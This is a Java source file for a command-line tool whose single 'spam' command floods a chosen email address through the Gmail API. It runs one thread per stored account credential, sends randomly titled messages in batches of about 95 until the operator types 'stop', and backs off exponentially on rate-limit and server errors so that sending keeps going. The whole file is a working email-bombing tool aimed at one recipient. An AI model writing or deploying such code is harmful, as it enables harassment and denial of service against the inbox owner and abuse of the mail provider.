import com.google.api.client.googleapis.batch.BatchRequest;
import com.google.api.client.googleapis.batch.json.JsonBatchCallback;
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport;
import com.google.api.client.googleapis.json.GoogleJsonError;
import com.google.api.client.googleapis.json.GoogleJsonResponseException;
import com.google.api.client.http.HttpHeaders;
import com.google.api.client.http.javanet.NetHttpTransport;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;

import javax.mail.MessagingException;
import java.io.File;
import java.io.IOException;
import java.security.GeneralSecurityException;
import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.Collectors;

public class CLI {
	private static AtomicInteger j = new AtomicInteger(0);
	private static String[] cmd;
	private static String toEmail;
	private static double start = 0.0;

	static void start() {
		new Thread(() -> {
			Scanner s = new Scanner(System.in);
			while(true) {
				cmd = s.nextLine().split(" ");
				System.out.println("command is " + Arrays.toString(cmd));

				switch(cmd[0]) {
					case "spam":
						if(cmd.length != 2) {
							System.out.println("Invalid number of arguments! There should be only one, specifying the email address to spam.\n\t" +
									"spam spamtest358@gmail.com");
							break;
						}

						toEmail = cmd[1];
						j.set(0);

						if(!toEmail.equals("stop")) {
							ArrayList<String> fileNames = Arrays.stream(Objects.requireNonNull(new File(RSSFeedReader.CREDENTIALS_FOLDER).listFiles()))
									.map(File::getName).collect(Collectors.toCollection(ArrayList::new));
							start = System.currentTimeMillis();

							for(String name : fileNames)
								new Thread(() -> {
									try {
										NetHttpTransport HTTP_TRANSPORT = GoogleNetHttpTransport.newTrustedTransport();
										Gmail gmail = new Gmail.Builder(HTTP_TRANSPORT, RSSFeedReader.JSON_FACTORY, RSSFeedReader
												.getCredentials(HTTP_TRANSPORT, name)).setApplicationName(RSSFeedReader.APPLICATION_NAME).build();
										BatchRequest batch = gmail.batch();
										ArrayList<Boolean> respMessages = new ArrayList<>(100);
										ArrayList<Message> allMessages = new ArrayList<>(100);
										JsonBatchCallback<Message> callback = new JsonBatchCallback<>() {
											@Override
											public void onSuccess(Message message, HttpHeaders responseHeaders) {
												respMessages.add(true);
											}

											@Override
											public void onFailure(GoogleJsonError e, HttpHeaders responseHeaders) {
												respMessages.add(false);
											}
										};

										double delay = 500.0;
										int local = j.getAndIncrement();

										while(!toEmail.equals("stop"))//(System.currentTimeMillis() - start) / 1000.0 <= 10.0
											try {
												allMessages.add(GoogleMail.createMessageWithEmail(GoogleMail.createEmail(toEmail, "blah@gmail.com",
														Long.toHexString(Double.doubleToLongBits(Math.random() / Math.random())), String.valueOf(local))));
												local = j.getAndIncrement();

												if(allMessages.size() >= 95) {
													while(allMessages.size() > 0) {
														for(Message m : allMessages)
															gmail.users().messages().send("me", m).queue(batch, callback);

														batch.execute();//Blocks until all requests callback

														//Remove successful messages
														Iterator<Message> iter = allMessages.iterator();
														int index = 0;
														while(iter.hasNext()) {
															iter.next();
															if(respMessages.get(index)) iter.remove();
															index++;
														}
														respMessages.clear();

														if(allMessages.size() == 0)
															break;

														System.out.println(allMessages.size());

														try {
															System.out.println("backoff " + Math.min(delay, 20000.0));
															Thread.sleep((long) (Math.min(delay, 20000.0) + Math.random() * 500));
															delay *= 2.0;
														} catch(InterruptedException ignored) {
														}
													}
												}

												delay = 500.0;
												System.out.println(j.get());
											} catch(MessagingException | IOException e) {
												if(e instanceof GoogleJsonResponseException) {
													int code = ((GoogleJsonResponseException) e).getDetails().getCode();
													System.out.println("Error: " + code + " " + ((GoogleJsonResponseException) e).getDetails().getMessage());

													if(String.valueOf(code).startsWith("5") || code == 429)
														try {
															System.out.println("backoff " + Math.min(delay, 20000.0));
															Thread.sleep((long) (Math.min(delay, 20000.0) + Math.random() * 500));
															delay *= 2.0;
														} catch(InterruptedException e1) {
															e1.printStackTrace();
														}
												} else e.printStackTrace();
											}
									} catch(IOException | GeneralSecurityException e) {
										e.printStackTrace();
									}
								}).start();
						}
						break;
				}
			}
		}).start();
	}
}